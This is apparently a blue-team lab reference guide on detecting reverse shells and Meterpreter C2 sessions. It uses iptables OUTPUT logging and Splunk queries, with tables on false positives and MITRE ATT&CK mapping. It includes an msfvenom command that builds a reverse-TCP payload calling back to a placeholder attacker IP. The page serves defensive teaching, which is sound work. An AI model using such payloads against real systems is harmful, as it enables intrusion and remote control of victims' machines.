# Reverse Shell Network Detection Lab — Fundamentals

This page covers all the core concepts you need for the Reverse Shell Network Detection Lab. It is structured as a reference guide you can return to at any point.

---

## 1. What is a Reverse Shell?

A reverse shell is a type of shell in which the **target machine** (victim) initiates the connection **back to the attacker's machine**, rather than the attacker connecting to the target.

This is the opposite of a **bind shell**, where the target opens a port and waits for the attacker to connect in.

### Why attackers use reverse shells

| Challenge | How a reverse shell solves it |
|---|---|
| Target is behind a NAT or firewall | Outbound connections are typically allowed; inbound connections are often blocked |
| Target has no open ports | No listening port needed on the target |
| Stealth | Looks like normal outbound traffic, not an inbound attack |

### The reverse shell flow

```
Attacker Machine (Kali)          Target Machine (Ubuntu)
┌─────────────────────┐          ┌─────────────────────┐
│ 1. Sets up listener  │          │                     │
│    on port 4444      │          │                     │
│                      │          │ 2. Payload executes │
│                      │◄─────────│    (SYN → Kali:4444)│
│ 3. Accepts shell     │          │                     │
│    session           │─────────►│ 4. Runs commands    │
└─────────────────────┘          └─────────────────────┘
```

---

## 2. Bind Shell vs Reverse Shell

Understanding the difference is fundamental to understanding why reverse shells are used in the real world.

| Feature | Bind Shell | Reverse Shell |
|---|---|---|
| Who initiates the connection? | Attacker connects to target | Target connects to attacker |
| Where does the port open? | On the target | On the attacker |
| Works through NAT? | ❌ Often blocked | ✅ Usually allowed |
| Works through outbound firewall? | ❌ May be blocked | ✅ Usually allowed |
| Detection difficulty | Easier (new open port on target) | Harder (looks like normal outbound traffic) |

💡 In modern networks, outbound connections are rarely blocked, while inbound connections are tightly controlled. This is why reverse shells are almost universally preferred in real-world attacks.

---

## 3. The TCP Three-Way Handshake (Revisited)

The reverse shell connection uses a normal TCP handshake. Unlike a port scan, every packet here is part of a legitimate, established connection.

```
Target (Ubuntu) → SYN → Attacker (Kali)    "I want to connect"
Attacker (Kali) → SYN-ACK → Target         "OK, I'm ready"
Target (Ubuntu) → ACK → Attacker (Kali)    "Let's talk"
```

After the handshake, the connection persists. Every shell command the attacker types and every output the target sends travels over this single established TCP session. The session remains open for as long as the attacker maintains the shell.

---

## 4. Metasploit Framework

### What is Metasploit?

Metasploit is the most widely used penetration testing framework in the world. It provides a collection of exploit modules, payloads, and tools that automate the process of attacking and maintaining access to target systems.

### Key components

| Component | Purpose |
|---|---|
| `msfconsole` | Interactive command-line interface for Metasploit |
| `msfvenom` | Standalone payload generator and encoder |
| Modules | Pre-built exploits, payloads, and post-exploitation tools |
| Listeners (handlers) | Wait for reverse connections from payloads |
| Sessions | Active connections to compromised targets |

### msfvenom

msfvenom is the payload generation tool. It creates standalone malicious files (ELF, EXE, APK, etc.) that, when executed on the target, establish a connection back to the attacker.

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf -o payload.elf
```

| Flag | Meaning |
|---|---|
| `-p` | Payload — the type of shell to generate |
| `LHOST` | Local host — the attacker's IP to call back to |
| `LPORT` | Local port — the port the attacker is listening on |
| `-f elf` | Format — ELF is the Linux executable format |
| `-o` | Output — the file to save the payload as |

---

## 5. Meterpreter

Meterpreter is Metasploit's advanced payload. It is significantly more powerful than a basic reverse shell because it runs entirely in memory and provides a rich interactive interface.

### Meterpreter vs Basic Shell

| Feature | Basic reverse shell (`/bin/bash`) | Meterpreter |
|---|---|---|
| Lives on disk? | The payload file does, shell doesn't | No — runs in memory |
| Encrypted traffic? | No | Yes (TLS) |
| File system access? | Via shell commands | Built-in commands (`download`, `upload`) |
| Screenshot capability? | No | Yes |
| Privilege escalation? | Manual | Automated modules available |
| Detection difficulty | Moderate | Higher — encrypted C2 traffic |

### Why Meterpreter matters for detection

Because Meterpreter traffic is TLS-encrypted, you cannot inspect the payload of the packets to determine what commands are being run. Detection must rely entirely on **network behaviour** — the existence, duration, and volume of the connection — rather than content inspection.

This is a fundamental challenge in real-world blue team work: you can detect that a reverse shell exists, but not necessarily what the attacker is doing with it, without additional endpoint telemetry.

---

## 6. Command and Control (C2)

### What is C2?

Command and Control (C2) refers to the infrastructure and protocols an attacker uses to communicate with compromised machines after initial access.

A reverse shell is one of the simplest forms of C2. More advanced frameworks (Cobalt Strike, Sliver, Havoc) use HTTPS, DNS, or even social media platforms as C2 channels to blend in with legitimate traffic.

### C2 detection approaches

| Approach | What it catches | Limitation |
|---|---|---|
| Port-based detection | Known C2 ports (4444, 1337) | Attacker simply changes the port |
| Volume/duration analysis | Long-lived connections with sustained traffic | Requires statistical baseline |
| Beacon interval analysis | Regular check-in patterns | Advanced C2 jitters timing |
| Threat intelligence | Known C2 IP addresses | Doesn't catch new infrastructure |
| Network flow analysis | Unusual destination/volume combinations | Requires NetFlow data |

In this lab, you use **volume/duration analysis** — detecting the high event count generated by a sustained active session.

---

## 7. Why This Differs from Previous Labs

| Lab | What generates the log | Where the log lives |
|---|---|---|
| SSH Brute Force | Failed authentication attempts | /var/log/auth.log |
| Port Scan Detection | Network connection attempts (incomplete TCP) | /var/log/syslog (iptables INPUT) |
| Reverse Shell Detection | Established outbound TCP session (complete TCP) | /var/log/syslog (iptables OUTPUT) |

The critical difference: a reverse shell uses a **completed, legitimate TCP connection**. It passes through firewalls, produces no auth log entries, and looks superficially like any other outbound connection. Detection requires looking for **sustained, high-volume traffic to a single external destination**.

---

## 8. iptables for Reverse Shell Detection

### Why the OUTPUT chain

Unlike port scan detection (which monitors the INPUT chain for inbound probes), reverse shell detection requires monitoring the **OUTPUT chain** — the outbound connections initiated by the victim machine.

```bash
sudo iptables -I OUTPUT -j LOG --log-prefix "IPTABLES_OUT: " --log-level 4
```

This captures every outbound packet from Ubuntu, including the sustained stream of packets making up the active Meterpreter session.

### Key fields in OUTPUT log lines

| Field | Meaning | Used in query |
|---|---|---|
| SRC | Victim machine IP | `by SRC` |
| DST | C2 server IP | `by DST` |
| DPT | C2 listener port | `by DPT`, alert on known C2 ports |
| SPT | Victim ephemeral port | Consistent per session |
| PROTO | TCP (for Meterpreter) | Protocol filter |
| OUT | Network interface | Direction confirmation |

---

## 9. Splunk & SPL for C2 Detection

### The detection pattern

A reverse shell produces a **high count of events on a single SRC → DST → DPT combination**. Normal outbound connections are short-lived (a web page loads, the connection closes). A Meterpreter session keeps the connection open and generates traffic continuously.

### Detection query structure

```splunk
index=main sourcetype=syslog IPTABLES_OUT
| stats count as connection_events by SRC, DST, DPT
| where connection_events > 500
AND NOT (DST="<known_safe_IP>" AND DPT="<known_safe_port>")
```

Read this as: filter to outbound iptables events → count events per unique source/destination/port combination → keep only sustained sessions → exclude known false positives.

### Key SPL commands for this lab

| Command | What it does |
|---|---|
| `stats count` | Counts total events per group |
| `by SRC, DST, DPT` | Groups results by the three-tuple identifying a unique connection |
| `where` | Filters aggregated results |
| `AND NOT (...)` | Compound exclusion for false positives |
| `sort - connection_events` | Orders results by event count descending |
| `eval` | Creates derived fields for enrichment |

---

## 10. Payload Delivery Methods

Understanding how payloads reach victims is important for both attack simulation and detection. In this lab, Python HTTP server is used — a simple but effective method.

| Method | Description | Detection |
|---|---|---|
| Python HTTP server | Victim downloads from attacker's temporary web server | HTTP GET in network logs |
| USB / physical access | Direct file copy | No network indicator |
| Email attachment | Payload delivered via phishing email | Email gateway logs |
| Exploit-based | Payload injected via vulnerability | IDS/IPS signatures |
| Supply chain | Payload embedded in legitimate software | Hard to detect |

---

## 11. False Positives in Reverse Shell Detection

### Common false positives

| Source | Why it looks like a reverse shell | How to handle it |
|---|---|---|
| Splunk Universal Forwarder | Sustained connection to Splunk indexer on port 9997 | Exclude by DST IP and DPT |
| Software update agents | Long-lived connections to update servers | Allowlist known update server IPs |
| Monitoring agents | Regular beaconing to monitoring platforms | Allowlist by DST IP |
| VPN / tunnelling software | Persistent encrypted connections | Allowlist known VPN endpoints |
| Database connections | Long-lived connections to database servers | Allowlist internal database IPs |

### Tuning levers

- **Raise the threshold** — reduces sensitivity to short bursts of legitimate traffic
- **Time window selection** — a 15-minute window targets active sessions without accumulating stale data
- **Destination allowlisting** — explicitly exclude known-good infrastructure
- **Port-based filtering** — flag well-known C2 ports (4444, 1337, 4545) more aggressively

---

## 12. The Detection Query

```splunk
index=main sourcetype=syslog IPTABLES_OUT
| stats count as connection_events by ___, ___, ___
| where connection_events > ___
AND NOT (___ AND ___)
```

### What each part does

- **`IPTABLES_OUT`** — keyword filter, only events from the OUTPUT chain LOG rule
- **`stats count as connection_events by SRC, DST, DPT`** — one row per unique source/destination/port combination, with total event count
- **`where connection_events > 500`** — threshold separates sustained sessions from short-lived connections
- **`AND NOT (DST="192.168.102.1" AND DPT="9997")`** — excludes the Splunk forwarder traffic

---

## 13. MITRE ATT&CK Context

| ATT&CK Element | Value |
|---|---|
| Tactic | Command and Control (TA0011) |
| Technique | T1059.004 — Unix Shell |
| Tactic | Execution (TA0002) |
| Related | T1071.001 — Web Protocols (C2 over HTTP/S) |
| Related | T1573 — Encrypted Channel |

Understanding ATT&CK mappings helps place individual detections in the broader context of the attack lifecycle. A reverse shell is typically a **post-exploitation** technique — used after initial access has already been achieved. Detecting it means an attacker has already breached the perimeter, making rapid response critical.
